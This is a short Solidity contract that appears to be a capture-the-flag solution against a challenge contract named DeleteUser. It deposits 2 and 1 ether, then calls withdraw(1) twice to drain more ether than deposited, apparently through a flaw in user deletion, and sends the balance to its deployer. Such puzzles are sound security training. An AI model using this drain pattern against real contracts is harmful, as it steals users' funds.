pragma solidity 0.8.15;

import "./DeleteUser.sol";

contract SolveDeleteUser {
    constructor(DeleteUser instance) payable {
        require(msg.value == 3 ether, "3 ethers are required");

        instance.deposit{value: 2 ether}();
        instance.deposit{value: 1 ether}();

        instance.withdraw(1);
        instance.withdraw(1);

        payable(msg.sender).transfer(address(this).balance);
    }
}
